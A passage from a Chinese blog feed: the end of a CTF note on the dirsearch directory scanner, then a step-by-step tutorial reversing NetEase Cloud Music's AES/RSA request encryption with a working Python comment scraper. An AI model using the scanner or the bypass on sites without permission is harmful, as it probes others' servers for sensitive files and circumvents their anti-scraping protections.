<h2 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用"></a>dirsearch使用</h2><p><strong>dirsearch</strong>是一个开源的网站目录爬虫工具，它可以帮助我们快速的对网站进行目录扫描，查找敏感文件和目录。</p>
<p>使用方法：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u [target_url]</span><br></pre></td></tr></table></figure></div>
<p>其中，-u 参数用于指定目标URL。Dirsearch还支持许多其他参数来定制扫描行为，例如：</p>
<ul>
<li>-e 用于指定文件扩展名，如-e php,txt,js。</li>
<li>-w 用于指定自定义字典文件。</li>
<li>-r 开启递归扫描。</li>
<li>-t 设置线程数。</li>
<li>-x 排除特定HTTP状态码。</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTFweb</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫系列-JS逆向网易云评论</title>
    <url>/2024/07/29/python%E7%88%AC%E8%99%AB%E7%B3%BB%E5%88%97-JS%E9%80%86%E5%90%91%E7%BD%91%E6%98%93%E4%BA%91%E8%AF%84%E8%AE%BA/</url>
    <content><![CDATA[<h2 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h2><p><strong>下载所需要的库</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br><span class="line">pip install pycryptodome<span class="comment">#实现AES加密</span></span><br></pre></td></tr></table></figure></div>


<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;orderType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pageSize&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;rid&quot;</span>: <span class="string">&quot;R_SO_4_2061978961&quot;</span>,</span><br><span class="line">        <span class="string">&quot;threadId&quot;</span>: <span class="string">&quot;R_SO_4_2061978961&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">f = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;</span></span><br><span class="line">e = <span class="string">&#x27;010001&#x27;</span></span><br><span class="line">g = <span class="string">&#x27;0CoJUm6Qyw8W8jud&#x27;</span></span><br><span class="line">i = <span class="string">&quot;ipvDWl7KgbnVS7Ot&quot;</span></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encSecKey</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;d25ce6c769e3acd5a638ef7abdd7c64e2dc3e848f6bfac507cd70ef7f45b16224aebb45a901b4660fe1ad4d36c4916432ef9e11db41c72269d3ae23e0515855a019d962b76c79dfd3b839c2653b7444757915d614ca822b20602ba99b4472a43bb62059ee6afcc241f9be7547ba96e3829651589288743a31548b9324a12dc07&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_params</span>(<span class="params">data</span>):<span class="comment">#默认收到的是字符串</span></span><br><span class="line">    first =enc_params(data,g)</span><br><span class="line">    second = enc_params(first,i)</span><br><span class="line">    <span class="keyword">return</span> second</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_params</span>(<span class="params">data, key</span>):</span><br><span class="line">    iv = <span class="string">b&#x27;0102030405060708&#x27;</span>  <span class="comment"># IV 应该是一个字节序列</span></span><br><span class="line">    key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 确保 key 是字节序列</span></span><br><span class="line">    aes = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)  <span class="comment"># 创建加密器对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充数据到16字节边界</span></span><br><span class="line">    padded_data = pad(data.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密填充后的数据</span></span><br><span class="line">    encrypted_data = aes.encrypt(padded_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回加密后的数据的 Base64 编码字符串</span></span><br><span class="line">    <span class="keyword">return</span> b64encode(encrypted_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: get_params(json.dumps(data)),<span class="comment">#转化为字符串</span></span><br><span class="line">    <span class="string">&quot;encSecKey&quot;</span>:get_encSecKey()</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, headers=headers, data=data).json()</span><br><span class="line"></span><br><span class="line">content_list = res[<span class="string">&#x27;data&#x27;</span>][<span class="string">&quot;hotComments&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">    <span class="built_in">print</span>(content[<span class="string">&#x27;content&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--&quot;</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><hr>
<p>首先，我们需要安装一些依赖库，这里我们需要用到<code>requests</code>和<code>pycryptodome</code>两个库。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure></div>

<p>使用requests进行网络请求，使用pycryptodome进行加密解密。</p>
<hr>
<h3 id="代码-分析"><a href="#代码-分析" class="headerlink" title="代码:分析"></a>代码:分析</h3><p>这次我们的目标是获取相关歌曲的评论</p>
<p>我们这次选择的网址为：<a class="link"   href="https://music.163.com/#/song?id=2061978961" >https://music.163.com/#/song?id=2061978961 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们还是和之前一样先去看网站的结构，看看我们要爬取的评论是不是在网页源代码里面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BU8pw"
                     
                ></p>
<p>我们发现在这个页面代码里面，可是我们如果去用<code>requests</code>库直接获取的时候，就会发现，我们什么也获取不到，因为网易云的评论是通过<code>AJAX</code>请求获取的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUBXo"
                     
                ></p>
<p>我们在看到页面源代码后按<code>ctrl+F</code>搜索<code>明年</code>这个刚才我们看到的关键字，但是什么也没有搜索出来，说明评论并不是在源代码里面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUUxI"
                     
                ></p>
<p>这样我们就只能去翻网易云的网络请求，看看这里有没有评论的相关信息，大家可以自己去每个都翻一下，找找，我们这里就不演示了，直接给大家展示出来。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BU0li"
                     
                ></p>
<p>我们可以看到，我们需要爬取的评论都在这个网络请求里面。</p>
<p>这时候我们可能就在想，既然在这里面，那我直接找到url，直接获取不就行了吗？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BU9tR"
                     
                ></p>
<p>可是，你看这<code>url</code>里面有个<code>csrf_token</code>，我感觉总有一些不对劲。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUaaz"
                     
                ></p>
<p>我们看，我们这样是什么东西都获取不到的。</p>
<p><code>csrf_token</code>是需要参数的，我们需要获取到这个参数才能获取到评论。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUh6e"
                     
                ></p>
<p>也就是说，我们需要获取到<code>params</code>和<code>encSecKey</code>这两个参数才能获取到评论。</p>
<hr>
<h3 id="代码-JS逆向分析"><a href="#代码-JS逆向分析" class="headerlink" title="代码:JS逆向分析"></a>代码:JS逆向分析</h3><p>我们当前看到的<code>params</code>和<code>encSecKey</code>是通过<code>JS</code>加密的，我们需要去找哪里的<code>JS</code>代码进行了加密。</p>
<p>找<code>js</code>我们就去<strong>发起程序</strong>中找。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUCyk"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUNUg"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUPMM"
                     
                ></p>
<p>我们直接从这里点进去看，就可以看到js加密的一步一步的过程。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUlZm"
                     
                ></p>
<p>图中加断点的地方就是最后把请求发送过来的JS，我们再看右侧的侧边栏。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BU7xX"
                     
                ></p>
<p>在这里，我们要找的<code>params</code>还是被加密的了，我们要先找到没有被加密的堆栈，我们就在红框下面一个一个的往下点，关注右边的侧边栏，直到我们看到<code>params</code>没有被加密。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUZZw"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUr4J"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUzCR"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BU3Fz"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUQze"
                     
                ></p>
<p>**这个时候，<code>params</code>还是加密的我们继续向下面找，继续点击堆栈的下一个程序。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUi0k"
                     
                ></p>
<blockquote>
<p><strong>接下来重点就要来了</strong></p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUtug"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BU4GM"
                     
                ></p>
<blockquote>
<p>这两张图片我们可以看到，在<code>tox.be0x</code>这个堆栈下面的<strong>匿名</strong>程序中，直接就没有了<code>params</code>的数据，而在<code>tox.be0x</code>这个堆栈中，又有了<code>params</code>，可见，<code>params</code>的加密就发生在<code>tox.be0x</code>里面。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BUYDX"
                     
                ></p>
<p>我们来仔细观察一下侧边栏，再回想一下我们要找的数据是什么?我们的url:”<a class="link"   href="https://music.163.com/weapi/comment/resource/comments/get?csrf_token=%22,%E9%9C%80%E8%A6%81%E4%B8%A4%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%98%AF%60params%60,%E4%B8%80%E4%B8%AA%E6%98%AF%60encSecKey%60%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8%E4%BE%A7%E8%BE%B9%E6%A0%8F%E4%B8%AD%E5%B0%B1%E4%BC%9A%E5%8F%91%E7%8E%B0%60encSecKey%60%E7%9B%B4%E6%8E%A5%E7%BB%99%E4%BA%86%EF%BC%8C%E8%80%8C%60params%60%E7%9A%84%E6%95%B0%E6%8D%AE%E5%B0%B1%E6%98%AF%60encText%60%E8%BF%99%E4%B8%AA%E6%95%B0%E6%8D%AE%E3%80%82" >https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;,需要两个参数，一个是`params`,一个是`encSecKey`，我们在侧边栏中就会发现`encSecKey`直接给了，而`params`的数据就是`encText`这个数据。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>现在我们需要干的事情就是，把加密的过程给弄懂，然后咱们把<code>params</code>和<code>encSecKey</code>都<strong>手搓</strong>出来。</p>
<p>我们来观察中间的代码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BkvCA"
                     
                ></p>
<p>在这里我们可以观察到<code>params</code>和<code>encSecKey</code>都是在<code>bvi6c</code>返回的json数据中获取的，我们可以在<code>bvi6c</code>上面打一下断电看看，数据的变化情况，在这里我就不展示了。我们可以清楚的看到是<code>bvi6c</code>这个函数进行了加密。</p>
<p>大家也可以把下面的滑块往右滑动，看看<code>bvi6c</code>的数据，在上面的数据这种并没有关于<code>params</code>和<code>encSecKey</code>信息的变化，而到了<code>bvi6c</code>这个函数中，就出现了我们要找的<code>encText</code>和<code>encSecKey</code>了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/Bk8z4"
                     
                ></p>
<p>所以，可以大胆推断，加密程序，一定是：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> bVi6c = <span class="variable language_">window</span>.<span class="title function_">asrsea</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(i0x), <span class="title function_">bse6Y</span>([<span class="string">&quot;流泪&quot;</span>, <span class="string">&quot;强&quot;</span>]), <span class="title function_">bse6Y</span>(<span class="title class_">Qu1</span>x.<span class="property">md</span>), <span class="title function_">bse6Y</span>([<span class="string">&quot;爱心&quot;</span>, <span class="string">&quot;女孩&quot;</span>, <span class="string">&quot;惊恐&quot;</span>, <span class="string">&quot;大笑&quot;</span>]));</span><br></pre></td></tr></table></figure></div>

<p>我们先看里面的<strong>四个参数</strong>，首先是<code>JSON.stringify(i0x)</code>,在刚才的右边栏中，我们能找到<code>i0x</code>的数据,即：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">csrf_token</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line"><span class="attr">cursor</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line"><span class="attr">offset</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line"><span class="attr">orderType</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line"><span class="attr">pageSize</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line"><span class="attr">rid</span>: <span class="string">&quot;R_SO_4_2061978961&quot;</span>,</span><br><span class="line"><span class="attr">threadId</span>: <span class="string">&quot;R_SO_4_2061978961&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>在<code>js</code>中，<code>JSON.stringify(i0x)</code>用于将一个 JavaScript 对象或值转换成 <strong>JSON 字符串</strong>，那很好，我们的第一个参数就知道了。</p>
<p>第二个参数<code>bse6Y([&quot;流泪&quot;, &quot;强&quot;])</code>，这，我们也看不出什么东西，在源代码中搜索也不会搜出什么东西，这个时候，我们也就需要发挥一下，控制台的作用了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/Bk9v6"
                     
                ></p>
<p>我们在控制台输入<code>bse6Y([&quot;流泪&quot;, &quot;强&quot;])</code>，然后回车，我们就能看到<code>bse6Y([&quot;流泪&quot;, &quot;强&quot;])</code>的结果了，这也是一个固定的值，剩下的两个参数<code>bse6Y(Qu1x.md)</code>和<code>bse6Y([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;])</code>也一样，在控制台可以看到他们的参数，也是固定的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BkP3n"
                     
                ></p>
<p>这样，加密用的四个参数，我们就全拿到手了，接下来，我们去看加密的过程。</p>
<hr>
<h3 id="代码-加密过程分析"><a href="#代码-加密过程分析" class="headerlink" title="代码:加密过程分析"></a>代码:加密过程分析</h3><p>首先说明，这里设置的<strong>a,b,c,d的函数</strong>，以及传入的<strong>a,b,c,d的参数</strong>，大部分都是来混淆你的，函数就是函数，参数就是参数，大家要分清楚。</p>
<p>在上面的源代码中，我们发现他是使用的<code>window.asrsea</code>这个函数进行的加密，所以，这是个啥函数，正常的<code>js</code>中可没有这个函数，这样，我们就只能去在页面源代码中搜索了，按<code>ctrl+F</code>搜索<code>window.asrsea</code>关键字，我们发现有<strong>两处</strong>使用了这个关键字，加密的地方算一次，那么第一次看来就是函数定义的地方了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://t.tutu.to/img/BkD5H"
                     
                ></p>
<blockquote>
<p>我们可以看到，<code>window.asrsea</code>函数就是<code>d</code>函数，他还想用<code>window.asrsea</code>这个名字混淆咱们。</p>
</blockquote>
<hr>
<p>这样我们来分析<code>d</code>函数。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var h = &#123;&#125;; //声明一个空对象 h</span><br><span class="line">i = a(16);//这行代码调用了一个函数 a 并传入参数 16，生成一个16位的随机字符串</span><br><span class="line">return h.encText = b(d, g)//将 b(d, g) 的结果赋值给 h.encText</span><br><span class="line">h.encText = b(h.encText, i) //将 b(h.encText, i) 的结果赋值给 h.encText</span><br><span class="line">h //最后返回对象 h</span><br></pre></td></tr></table></figure></div>

<p>在这里<code>b</code>函数调用了两次，第二次才是真正的<code>encText</code>。</p>
<p>这个<code>return</code>语句，在这里并没有运行到这里就退出的作用。</p>
<hr>
<p>我们来看看<code>a</code>函数。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">function</span> <span class="title function_">a</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> d, e, b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>, c = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (d = <span class="number">0</span>; a &gt; d; d += <span class="number">1</span>)</span><br><span class="line">        e = <span class="title class_">Math</span>.<span class="title function_">random</span>() * b.<span class="property">length</span>,</span><br><span class="line">        e = <span class="title class_">Math</span>.<span class="title function_">floor</span>(e),</span><br><span class="line">        c += b.<span class="title function_">charAt</span>(e);</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数就是生成一个16位的随机字符串，我们可以看到，他是用<code>Math.random()</code>生成了一个随机数，然后用<code>Math.floor()</code>取整，然后用<code>charAt()</code>取出字符，然后拼接起来,最后把<code>c</code>返回，这个函数的作用就是生成一个随机字符串。</p>
<p>所以，<code>i</code>是一个随机的字符串。</p>
<hr>
<p>按照<code>d</code>函数的逻辑，接下来就是<code>h.encText = b(d, g)</code>,这里调用了<code>b</code>函数，我们来看看<code>b</code>函数。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(b)</span><br><span class="line">      , d = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(<span class="string">&quot;0102030405060708&quot;</span>)</span><br><span class="line">      , e = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(a)</span><br><span class="line">      , f = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(e, c, &#123;</span><br><span class="line">        <span class="attr">iv</span>: d,</span><br><span class="line">        <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> f.<span class="title function_">toString</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>var c &#x3D; CryptoJS.enc.Utf8.parse(b)   &#x2F;&#x2F;将第二个参数 b 解码为 UTF-8 格式的字节数组，存储在变量 c 中。</li>
<li>var d &#x3D; CryptoJS.enc.Utf8.parse(“0102030405060708”)   &#x2F;&#x2F;解码一个硬编码的16字节的初始化向量（IV），存储在变量 d 中。</li>
<li>var e &#x3D; CryptoJS.enc.Utf8.parse(a)   &#x2F;&#x2F;将第一个参数 a 解码为 UTF-8 格式的字节数组，存储在变量 e 中。</li>
<li>var f &#x3D; CryptoJS.AES.encrypt(e, c, { … });   &#x2F;&#x2F;使用 AES 加密算法和 CBC 模式加密变量 e，使用变量 c 作为密钥，变量 d 作为 IV。加密结果存储在变量 f 中。</li>
<li>return f.toString()   &#x2F;&#x2F;返回加密结果的字符串表示形式。</li>
</ul>
<blockquote>
<p>在这里我们需要知道的是，<strong>在这里实现AES的CBC加密算法</strong>，需要<strong>四个参数</strong></p>
<ol>
<li>明文（Plaintext）：这是需要加密的原始数据。</li>
<li>密钥（Key）：加密数据时使用的密钥。对于 AES，密钥长度可以是 128 位（16 字节）、192 位或 256 位。</li>
<li>初始向量（IV）：一个随机生成的值，用于初始化加密过程。在 CBC 模式中，IV 必须是唯一的，并且长度通常与块大小相同（对于 AES，通常是 16 字节）。</li>
<li>加密模式（Mode）：AES 加密算法支持三种模式：ECB、CBC 和 CFB。在 CBC 模式中，每个明文块先与上一个密文块进行异或运算后，再与密钥进行加密。在这个例子中，指定为 CBC（密码块链接模式）。CBC 模式是一种常用的加密模式，它使用前一个块的加密结果来加密当前块，从而提高安全性。</li>
</ol>
</blockquote>
<p>但是说实话，我们并不需要知道这么多(<strong>当然，你如果深入了解这个的话，能更好的帮助你写代码</strong>)。</p>
<p>在这里的代码</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">f = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(e, c, &#123;</span><br><span class="line">            <span class="attr">iv</span>: d,</span><br><span class="line">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span></span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><code>e</code>为加密的<code>明文数据</code>,<code>c</code>为加密的<code>密钥</code>,<code>iv</code>为加密的<code>初始向量</code>，模式选择<code>CBC</code>。</p>
</blockquote>
<p><code>b</code>函数是由<code>d</code>函数调用的，<code>a</code>为传入的<strong>b函数</strong>的第一个参数，<strong>d函数</strong>传入<strong>b函数</strong>的第一个参数就是我们获取到的<code>JSON.stringify(i0x)</code>数据。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">d</span>(<span class="params">d, e, f, g</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = &#123;&#125;</span><br><span class="line">          , i = <span class="title function_">a</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">return</span> h.<span class="property">encText</span> = <span class="title function_">b</span>(d, g),</span><br><span class="line">        h.<span class="property">encText</span> = <span class="title function_">b</span>(h.<span class="property">encText</span>, i),</span><br><span class="line">        h.<span class="property">encSecKey</span> = <span class="title function_">c</span>(i, e, f),</span><br><span class="line">        h</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(b)</span><br><span class="line">          , d = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(<span class="string">&quot;0102030405060708&quot;</span>)</span><br><span class="line">          , e = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(a)</span><br><span class="line">          , f = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(e, c, &#123;</span><br><span class="line">            <span class="attr">iv</span>: d,</span><br><span class="line">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> f.<span class="title function_">toString</span>()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>单纯这样讲可能不太直白，大家来看图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_js_3/Snipaste_2024-07-29_17-32-34.png"
                     
                ></p>
<p>这样加密完后，用<code>toString()</code>方法转换成字符串。</p>
<hr>
<p>按照<code>d</code>函数的逻辑，接下来就是<code>h.encSecKey = c(i, e, f)</code>,这里调用了<code>c</code>函数，我们来看看<code>c</code>函数。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">c</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> d, e;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">setMaxDigits</span>(<span class="number">131</span>),</span><br><span class="line">    d = <span class="keyword">new</span> <span class="title class_">RSAKeyPair</span>(b,<span class="string">&quot;&quot;</span>,c),</span><br><span class="line">    e = <span class="title function_">encryptedString</span>(d, a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是，如果我们仔细看<code>d</code>函数的调用，我们就会发现一个，有趣的事情。</p>
<p>在<code>d</code>函数中调用了<code>c</code>函数，并传入了三个值，第一个值是<code>i</code>，第二个值是<code>e</code>，第三个值是<code>f</code>。</p>
<ol>
<li><code>i</code>：这个值是随机生成的16位字符串</li>
<li><code>e</code>：这个值是<code>bse6Y([&quot;流泪&quot;, &quot;强&quot;])</code></li>
<li><code>f</code>：这个值是<code>bse6Y([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;])</code></li>
</ol>
<p><code>e</code>和<code>f</code>都是固定的值，那我们把<code>i</code>给固定住，那么<code>c</code>函数不就只返回一个固定的值了吗？大家可以在这个地方打个断点，看看<code>i</code>的值，并复制下来直接用，因为<code>c</code>函数还有其他更多函数的分析，我们就不展开了。</p>
<p>先在这里打断点<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_js_3/Snipaste_2024-07-29_18-21-09.png"
                     
                ></p>
<p>直到右边栏出现这个，也就是我们要找的url</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_js_3/Snipaste_2024-07-29_18-23-22.png"
                     
                ></p>
<p>我们再回到<code>d</code>函数打断点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_js_3/Snipaste_2024-07-29_18-24-22.png"
                     
                ></p>
<p>然后我们一步一步的运行，找到<code>i</code>以及由<code>i</code>生成的<code>encSecKey</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../blog_img/py_js_3/Snipaste_2024-07-29_18-26-08.png"
                     
                ></p>
<p>把这两个复制下来。</p>
<blockquote>
<p>至此，我们已经分析完了加密过程，拿到了我们应该用到的参数，接下来我们就去python，实现代码的复原。</p>
</blockquote>
